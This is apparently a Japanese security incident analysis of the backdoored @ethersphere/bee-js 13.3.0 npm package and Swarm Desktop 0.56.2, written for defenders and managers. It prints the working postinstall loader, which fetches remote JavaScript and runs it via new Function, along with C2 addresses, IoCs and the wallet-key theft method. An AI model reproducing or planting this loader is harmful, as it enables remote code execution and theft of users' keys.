**分散ストレージ Swarm の開発元 Ethersphere のリリース自動化が乗っ取られ**、 **npm パッケージ `@ethersphere/bee-js` 13.3.0 と GitHub リリース Swarm Desktop 0.56.2 に同一のバックドア・ローダーが仕込まれて配布された** （出典1〜3）〈重要〉。 **bee-js は Ethersphere の正規の trusted publishing ワークフローから 有効な来歴証明（provenance）付きで公開され**、 **Swarm Desktop の macOS 版はプロジェクトの Developer ID で署名され Apple の公証も 通過していた**（出典2・3）〈重要〉—— **供給網の真正性を担保する仕組みが、改ざんされた成果物をそのまま通した。** **npm は公開から約75分後（2026年11月9日01時24分58秒 UTC）に 13.3.0 を削除**し、 **Ethersphere は同日12時52分 UTC に Swarm Desktop 0.56.3 を 「侵害された 0.56.2 リリースの差し替え」として公開した**（出典1・4）。 **ローダーは Ethereum コントラクトから C2 のアドレスを読むため、ドメインの停止では 遮断できず、攻撃者は1回のトランザクションで接続先を変えられる**（出典2）〈重要〉。 **窃取対象は Swarm ノードのウォレット鍵**で、 **暗号化された鍵ファイルと平文のパスワードが同じ端末に揃っているため秘密鍵が復元できる** （出典2）。 **侵害された GitHub アカウントは2つ（メンテナ `nugaon` とリリース自動化 `bee-worker`）だが、 その侵害の起点は説明されていない**（出典3）〈未確定1〉。

分散ストレージネットワーク Swarm の開発元 Ethersphere のリリース経路が乗っ取られ、2種類の成果物に同一のバックドア・ローダーが仕込まれて配布されました。

ひとつは npm パッケージ @ethersphere/bee-js 13.3.0 です。Swarm ノードを操作する JavaScript クライアントで、2026年11月初旬のダウンロードは1日あたり約470件でした。バージョン生成スクリプト scripts/generate-version.cjs が遠隔コードのローダーに書き換えられ、postinstall フックに昇格されました。177ある既存バージョンのどれにもインストール時フックは無く、これが初めてです。

もうひとつは GitHub リリースの Swarm Desktop 0.56.2 です。Bee ノード（と、そのノードが持つ Ethereum ウォレット）を動かす Electron アプリで、Linux・macOS・Windows の9パッケージすべてが同じ CI 実行から作られ、Electron のメインプロセスに同じローダーが入っていました。 macOS 版はプロジェクトの Developer ID で署名され、Apple の公証も通っています。 Apple Silicon と Windows x64 の利用者には、アプリの自動更新で届きました。

ここが本件の要点です。 bee-js は Ethersphere の正規の trusted publishing ワークフローから、有効な来歴証明（provenance）付きで npm に公開されました。来歴証明も Apple の公証も「どこで作られたか」は証明しますが、「中身が意図したものか」は証明しません。リリース経路そのものが乗っ取られた場合、これらの仕組みは改ざんされた成果物をそのまま通します。

ローダーは api.frameworkmetrics[.]xyz から JavaScript を取得し、Node.js の全権限（require を渡した new Function）で実行します。取得されるペイロードは Swarm Desktop のデータフォルダから config.yaml とdata-dir/keys/swarm.key を読み出して送信します。鍵ファイルは暗号化された Ethereum キーストアですが、そのパスワードが同じ端末の config.yaml に平文で置かれているため、両方そろえば秘密鍵が復元できます。xDAI・xBZZ・チェックブックの資金・ステークが射程です。後段では、Linux/macOS に Go 製の遠隔シェル（~/.solidity/ に設置・systemd / LaunchAgent で永続化）、Windows には UAC バイパスを経て正規の ScreenConnect クライアントを改変したものをSYSTEM サービスとして入れます。

C2 の居場所は Ethereum のスマートコントラクト0xf8a900Db50b3331be6B768bA460BB59f3E40C344 から読み出されます。 2026年3月14日に配置され、同じウォレットが維持し、これまで7つの接続先を指してきました。ドメインを停止しても遮断できず、攻撃者は1回のトランザクションで接続先を変えられます。このコントラクトとウォレット、後段の実装ファイルは、2026年10月1日に Pluto Security が公表した SleepyDuck / EtherDuck のOpen VSX キャンペーンと同一です。

対応は速かったものの、片方だけです。npm は公開から約75分後に 13.3.0 を削除しました（公開 00時09分50秒 UTC → 削除 01時24分58秒 UTC）。Swarm Desktop 0.56.2 はその間も残り、Ethersphere が差し替え版 0.56.3 を公開したのは同日 12時52分 UTC です。リリースノートには 「侵害された 0.56.2 リリースの差し替え」（原文英語: "replace compromised 0.56.2 release"）とだけ書かれています。

暗号化された鍵ファイルと平文のパスワードが同じ端末に揃っている被害規模・影響範囲

ローダーは scripts/generate-version.cjs の先頭に置かれ、無条件に先に走る（出典3）。

const req = require('https').get(
  'https://api.frameworkmetrics.xyz/v1/analytics',
  { headers: { 'User-Agent': process.platform, 'X-Ethersphere': '1' },
    timeout: 3000 },
  async res => {
    let body = ''
    for await (const chunk of res) body += chunk
    new Function('require', 'console', 'process', body)(require, console, process);
  },
)

環境・CI・ロケール・時刻のいずれの判定も無い。 返ってきたものは new Function でコンパイルされ、本物の require・console・process を渡して呼ばれる——つまりインストールした利用者の権限で、任意の Node.js モジュールを読み込めるコードが走る。応答のステータス・content type・サイズは一切検査されない。周囲のコメントは「コード生成」と「analytics の ping」を装い、ヘッダのコメントには「このスクリプトはインストールを絶対に失敗させてはならない」とある。

その「失敗させない」約束は半分しか本当ではない（出典3 の指摘）——要求レベルのエラー（DNS 失敗・TLS 失敗・3秒以内に応答なし）は飲み込まれてインストールは静かに成功する。だが応答が始まった後のエラーは try で囲われていない。本文が正当な JavaScript でない、ペイロードが例外を投げる、転送が止まる——いずれも未処理の promise の reject になり、Node.js 15 以降は終了コード1でインストールが失敗する。つまりインストールの失敗は「その端末が無事だった」証拠にならない——要求はすでに送られている。

窃取されるもの（出典2）〈重要〉——ペイロードは Swarm Desktop のデータフォルダから次の2つを読み、C2 の /v1/swarm/report へ送る。

  • data-dir/keys/swarm.key——暗号化された Ethereum キーストア
  • config.yaml——そのキーストアのパスワードが平文で入っている

暗号化されていても、復号パスワードが同じ端末の設定ファイルに平文で置かれている。両方そろえば秘密鍵が復元でき、xDAI・xBZZ・チェックブックの資金・ステークが射程に入る。

後段（出典2）——

  • Linux / macOS: Go 製の遠隔シェル evjawbreaker を ~/.solidity/ に設置し、systemd ユニットまたは LaunchAgent で永続化。現在のハブは 193.57.9.155:4912。
  • Windows: UAC バイパス（UACME の手法39）で管理者権限を取り、正規の ScreenConnect クライアントを改変したものを SYSTEM サービスとして導入。 Defender の除外設定を一時的に追加し、後で削除する。リレーは 185.232.84.169:8041。
  • 両方の宛先はオランダのホスティング事業者 Onidel 上にある。

後段が接続先を知る方法が、本件の封じ込めを難しくしている（出典2）〈重要〉。

ローダーの後段は、Ethereum コントラクト0xf8a900Db50b3331be6B768bA460BB59f3E40C344 からハブのアドレスを読む。コントラクトは 2026年3月14日に配置され、同じウォレットが維持し、これまで7つのハブを指してきた。 読み出しはパブリックな RPC 経由で行われるため、ドメインのテイクダウンでは遮断できず、攻撃者は1回のトランザクションで接続先を変えられる。

このコントラクトとウォレット、後段の実装ファイルは、2026年10月1日に Pluto Security が公表した SleepyDuck / EtherDuck のOpen VSX キャンペーン（悪性の Solidity 拡張）のものと同一である（出典2・3）。つまり本件は新しい攻撃者の初手ではなく、既存キャンペーンが配布経路を npm と GitHub リリースに広げたものである（本記録の読み）。

SafeDep が推奨する対応は次のとおり（出典2）。

  • 対象のインストールがあった端末を侵害されたものとして扱う
  • Swarm ノードの資金とステークを新しい鍵へ移し、旧鍵は漏えいしたものとみなす
  • ~/.solidity/ と systemd ユニット / LaunchAgent、Windows のScreenConnect Client (5cbe79c9c25524df) サービスを削除する

本記録は IoC の悪性を独自に検証していない（照合先のテレメトリを持たないため）。またIP・ドメインの IoC は攻撃者の1トランザクションで無効になりうることを前提に使う必要がある（本記録の注記）。

第一に、本件は来歴証明（provenance）と公証の限界をそのまま示している。〈重要〉bee-js は OIDC による trusted publishing を2026年1月から使い、長期の npm トークンを持っていなかった。これは「トークンが漏れてパッケージが publish される」古典的な事故を防ぐ仕組みであり、実際にその攻撃は防がれている。だが本件の攻撃者はトークンを狙わず、リリース経路の手前（コミットとリリースの作成）を乗っ取った。結果として、来歴証明は「Ethersphere の正規ワークフローで作られた」ことを正しく証明し、Apple の公証は「プロジェクトの Developer ID で署名された」ことを正しく証明した。どちらも嘘をついていない。 証明しているのは出所であって、中身ではない。

ここから導かれる実務的な結論は1つである—— 来歴証明の有無を「安全」の判定条件に使ってはならない。使えるのは「出所の照合」としてであり、中身の判定には別の仕組み（インストール時フックの検知・ふるまいの観測・差分レビュー）が要る。

第二に、postinstall の新設は検知可能な信号である。 177バージョンのどれにもインストール時フックが無かったパッケージに、13.3.0 で初めて postinstall が付いた。「依存パッケージの新バージョンでインストール時フックが新たに現れた」ことは、機械的に検知できる差分である（本記録の評価）。SafeDep の自動解析が公開の1〜4分後に悪性と判定できたのは、この種の信号が強いことの裏返しでもある。

第三に、75分と8時間半（または12時間）の差が何を意味するか。 npm はレジストリ運営者として削除でき、実際に75分で削除した。GitHub リリースと自動更新は、配布者自身が差し替えるしかない。本件では当事者のアカウントが侵害されていたため、「気づいて動ける主体」が一時的に不在だった可能性がある（本記録の推定。公表されていない）。自動更新を持つアプリは、配布者が止まったときに被害が伸びる。利用者側には、自動更新を一時停止できる手段と、更新の来歴を事後に確認できる記録が要る。

第四に、ウォレットの鍵と平文パスワードの同居である。 swarm.key は暗号化されているが、復号パスワードは config.yaml に平文で置かれている。これは本件の攻撃者が作った状況ではなく、製品の設計である。暗号化された鍵ファイルは「ファイル単体が漏れたとき」には守るが、端末上でコードが走る攻撃者には何も守らない。鍵と資金を扱うソフトウェアでは、ここが「暗号化しているから安全」と誤解されやすい箇所である（本記録の指摘）。

第五に、C2 をブロックチェーンに置く設計の意味である。接続先がコントラクトから読まれるため、防御側が止められるのは個々のハブだけで、指示の経路そのものは止められない。パブリックな RPC への読み出しは通常の通信に紛れる。IoC ベースの封じ込めは、この構造の前では一時的な効果しか持たない。検知の軸は、接続先ではなくふるまい（~/.solidity/ への設置、LaunchAgent / systemd の新設、ScreenConnect の予期しない SYSTEM サービス化、Defender 除外の一時追加）に置く必要がある。

第六に、当事者の情報公開は不十分である（本記録の判断）。差し替え版のリリースノート1行以外に説明が無い。利用者が知る必要があるのは、少なくとも「どのバージョンが影響を受けたか」「取得していた場合に何をすべきか」「鍵を入れ替えるべきか」である。本件ではこれらをすべて第三者のベンダー分析から得るしかない。ウォレット鍵を扱うソフトウェアとしては、鍵の入れ替えの呼びかけが当事者から出ていないことが最も重い欠落である。

対応の評価

評価材料がない判断は「評価材料なし」としています。結果論で断じないための区分です。
判断評価評価の根拠と留保
Ethersphere は Swarm Desktop 0.56.3 のリリースノートに "replace compromised 0.56.2 release"（侵害された 0.56.2 リリースの差し替え）と 記した。本記録の作成時点で、これ以外の説明（侵害経路・影響範囲・ 利用者が取るべき対応・鍵の入れ替えの要否）は確認できていない不十分本記録の作成者の評価である。配布の停止（0.56.3 の公開）は当日中に行われており、 その点は評価できる。 一方で、**利用者が知る必要がある3点——どのバージョンが影響を受けたか、 取得していた場合に何をすべきか、鍵を入れ替えるべきか——はいずれも 当事者から示されていない。** とくに「鍵の入れ替え」の呼びかけが無いことは、 ウォレット鍵が窃取対象である本件において最も重い欠落である。 利用者はこれらをすべて第三者のベンダー分析から得るしかない状態にある
npm（GitHub, Inc.）がレジストリ運営者として `@ethersphere/bee-js` 13.3.0 を公開から約75分後に削除した。 本記録の作成時点で `latest` は 13.2.0（2026年10月15日）に戻っている機能した本記録の作成者の評価である。75分という削除の速さは、 インストール時フックを持つ悪性パッケージへの対応として速い。 一方で、**配布経路が2つあり、レジストリ運営者が介入できたのは片方だけだった** 点が本件の特徴である。 GitHub リリースと自動更新は配布者自身が差し替えるしかなく、 その配布者のアカウントが侵害されていた
本件の分析は第三者のベンダー（SafeDep・Socket）が行い、同日に公開した。 Ethersphere 自身による調査結果の公表は確認できていない部分的に機能本記録の作成者の評価である。第三者による検知と分析は機能した （公開の1〜4分後の自動判定、同日の詳細分析2本、IoC 65件）。 **ただし「再発を防げたか」は当事者の対応に依存し、それが公表されていない。** とくに侵害の起点が説明されていないため、 同じ経路が閉じられたのかを外部から判断できない
CISO・経営層への示唆
  • 来歴証明（provenance）や公証の有無を「安全」の判定条件にしない
    本件の bee-js は Ethersphere の正規の trusted publishing ワークフローから 有効な来歴証明付きで公開され、Swarm Desktop の macOS 版はプロジェクトの Developer ID で署名され Apple の公証も通過していた。 **これらが証明するのは「どこで・どの経路で作られたか」であって 「中身が意図したものか」ではない**（本記録の整理）。 リリース経路が乗っ取られれば、正規の印が付いた改ざん成果物が配布される
    取るべき行動 社内の調達・導入基準から「署名済み／来歴証明あり／公証済みであること」を 単独の合格条件として外し、出所の照合条件として位置づけ直す。 中身の判定（インストール時フックの検知・ふるまいの観測・差分レビュー）を 別の必須項目として追加する
  • 自動更新を持つソフトウェアは「配布者が侵害された場合」を想定した停止手段を持つ
    本件では Swarm Desktop 0.56.2 が自動更新で Apple Silicon と Windows x64 の 利用者に配信された。npm は運営者として75分で削除できたが、 **GitHub リリースと自動更新は配布者自身が差し替えるしかなく、 その配布者のアカウントが侵害されていた**（本記録の指摘）。 結果として配布の停止は npm より大幅に遅れた
    取るべき行動 自動更新を持つ業務利用ソフトウェアを一覧化し、 それぞれについて「更新を一時停止する手段」と「適用済みバージョンを 事後に確認する記録」を確保する。 停止の判断権者と発動条件（配布元の侵害報告）を Runbook に書く
  • 開発者端末・CI を「鍵と資金に届く端末」として分類し直す
    本件のペイロードはウォレット鍵と平文パスワードを窃取し、 xDAI・xBZZ・チェックブックの資金・ステークを射程に入れた。 `postinstall` はインストールした利用者の権限で走るため、 **開発者端末と CI は「依存をインストールするだけで任意コードが走る場所」である** （本記録の評価）。そこに鍵や本番資格情報が置かれていれば、同じ射程に入る
    取るべき行動 依存パッケージをインストールする端末・CI に置かれている秘密情報 （クラウド資格情報・署名鍵・ウォレット鍵・本番トークン）を棚卸しし、 外部の秘密管理へ移すか、インストールを行う環境から分離する。 分離が間に合わない範囲には `--ignore-scripts` を既定にする
  • 供給網の侵害では「被害が無いと確認された利用者の一覧は存在しない」前提で動く
    本件で公表されているのは「どのバージョンが悪性だったか」だけである。 **どの組織・どの CI が 13.3.0 や 0.56.2 を取得したかは示されていない** （公表された取得実績は Windows 自動更新の17回のみ）。 したがって影響判定は利用者側でしか行えない（本記録の明示）
    取るべき行動 依存パッケージの取得履歴を追跡できる記録（lockfile の履歴・ パッケージキャッシュ・プロキシのログ・CI の実行ログ）を 少なくとも90日保持する運用にし、 侵害公表から24時間以内に「自社が取得したか」を答えられる状態にする
  • 鍵を扱うソフトウェアの事故では、当事者の公表を待たずに鍵の入れ替えを判断する
    本件で Ethersphere が出した説明は差し替え版のリリースノート1行 （"replace compromised 0.56.2 release"）のみで、 **鍵の入れ替えの呼びかけは無い**（本記録の確認）。 一方で第三者分析は「資金とステークを新しい鍵へ移し、旧鍵は漏えいしたものとみなす」 ことを推奨している。当事者の公表を待つと判断が遅れる
    取るべき行動 暗号資産・署名鍵・API キーを扱うソフトウェアごとに 「鍵の入れ替え手順」と「入れ替えに要する時間・停止時間」を事前に文書化する。 配布元の侵害が報じられた時点で、当事者の公表を待たずに 入れ替えを開始する判断基準を決めておく
セキュリティ技術者への示唆
  • 依存パッケージの新バージョンで「インストール時フックが新設された」ことを検知する
    bee-js の packument には177のバージョンがあり、**そのいずれもインストール時フックを 宣言していなかった。13.3.0 の `postinstall` が初めてである**（出典3）。 これは機械的に検知できる差分であり、 SafeDep の自動解析が公開の1〜4分後に悪性と判定できた背景でもある（本記録の評価）
    取るべき行動 依存更新の自動チェックに「`scripts` の `preinstall`/`install`/`postinstall` の 新設・変更」と「`files` への新ディレクトリ追加」を検出するルールを入れ、 該当したらマージを止める。Renovate / Dependabot の自動マージ対象からも外す
  • CI とビルド環境では `--ignore-scripts` を既定にし、外向き通信を許可リストで絞る
    本件のローダーは **bee-js の公開ジョブの中でも3回実行された**（出典3）。 インストールスクリプトは CI の中でも走り、そこには署名鍵やトークンがある。 ローダーは環境・CI の判定を一切行わず、応答を `new Function` で 本物の `require` を渡して実行する
    取るべき行動 CI の依存インストールを `npm ci --ignore-scripts` に切り替え、 ビルドに本当に必要なスクリプトだけを明示的に許可する。 CI ランナーの外向き通信をレジストリとアーティファクト置き場に限定する
  • リリースを起動できるのは署名済み・レビュー済みのコミットだけに限定する
    改ざんコミット `de2f74e` は**署名なし**で、**どのブランチにも属さず、 プルリクエストを経ていない**。それでいて正規の公開ワークフローが動いた（出典3）。 Ethersphere の本物のリリースコミットは GitHub API 経由で作られ Verified のバッジが付くため、**署名の有無で機械的に区別できたはずである** （本記録の評価）
    取るべき行動 リリースワークフローの先頭に「起動元コミットの署名検証」と 「そのコミットが保護ブランチに含まれることの確認」を入れ、 満たさない場合は失敗させる。tag の保護を有効にし、 保護されていない master への force-push 権限を外す
  • ウォレット鍵・署名鍵の復号パスワードを同じ端末の平文ファイルに置かない
    `swarm.key` は暗号化された Ethereum キーストアだが、 **その復号パスワードが同じ端末の `config.yaml` に平文で保存されている**（出典2）。 **暗号化された鍵ファイルは「ファイル単体が漏れたとき」には守るが、 端末上でコードが走る攻撃者には何も守らない**（本記録の指摘）
    取るべき行動 自組織が運用する鍵（ノードの運用鍵・署名鍵・API キー）について、 鍵ファイルとパスワードの保存場所を一覧化し、同一端末の平文に揃っているものを OS のキーチェーン・HSM・外部の秘密管理へ移す。 移行が難しい場合は、その鍵が持つ資産の上限を下げる
  • C2 がブロックチェーン上にある攻撃では、IoC をふるまい側で組む
    後段は Ethereum コントラクト `0xf8a900Db50b3331be6B768bA460BB59f3E40C344` から 接続先を読み出す。**パブリックな RPC 経由なのでドメインのテイクダウンでは 遮断できず、攻撃者は1回のトランザクションで切り替えられる**（出典2）。 すでに7つのハブが指されている
    取るべき行動 検知ルールを接続先ではなくふるまいで組む——`~/.solidity/` への実行ファイル設置、 LaunchAgent / systemd ユニットの新設、予期しない ScreenConnect の SYSTEM サービス化、Defender 除外設定の一時的な追加。 IP・ドメインの IoC は短命である前提で有効期限を付けて運用する
  • 「インストールが失敗した」ことを無事の証拠にしない
    ローダーは要求レベルのエラー（DNS・TLS の失敗、3秒のタイムアウト）を飲み込むが、 **応答が始まった後のエラーは try で囲われていない**ため 未処理の promise の reject になり、Node.js 15 以降はインストールが失敗する（出典3）。 **その時点で要求はすでに送信済みである**
    取るべき行動 対象バージョンの導入を試みた記録があれば、インストールの成否にかかわらず 侵害調査の対象に含める。CI の失敗ログを「エラーだから無害」として 閉じない運用にする

自組織に当てはまるか

観点自社に当てはまるか該当する場合に何が起きうるか
委託・第三者部品□ `@ethersphere/bee-js` を依存に持つアプリケーション・CI があり、 2026年11月9日00時09分50秒〜01時24分58秒 UTC の約75分間に 依存の取得・更新を行った可能性があるこの75分間に取得していれば `postinstall` でローダーが実行された。 インストールの成否は無事の証拠にならない（応答開始後のエラーで失敗しても 要求は送信済み）
委託・第三者部品□ Swarm Desktop を利用しており、0.56.2 を導入した、または自動更新が有効だった （とくに Apple Silicon または Windows x64）0.56.2 は Electron のメインプロセスにローダーを含み、起動ごとに C2 を呼ぶ。 macOS 版は Developer ID 署名と Apple 公証を通過しているため、 署名の検査では区別できない
